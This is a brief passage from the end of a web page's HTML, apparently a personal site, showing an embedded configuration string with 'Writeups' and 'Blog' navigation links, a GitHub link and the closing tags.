Writeups\",\"link\":\"/writeups\"},{\"text\":\"Blog\",\"link\":\"/blog\"}],\"socialLinks\":[{\"icon\":\"github\",\"link\":\"https://github.com/N00bcak\"}]},\"locales\":{},\"scrollOffset\":134,\"cleanUrls\":false,\"additionalConfig\":{}}");</script>
    
  </body>
</html>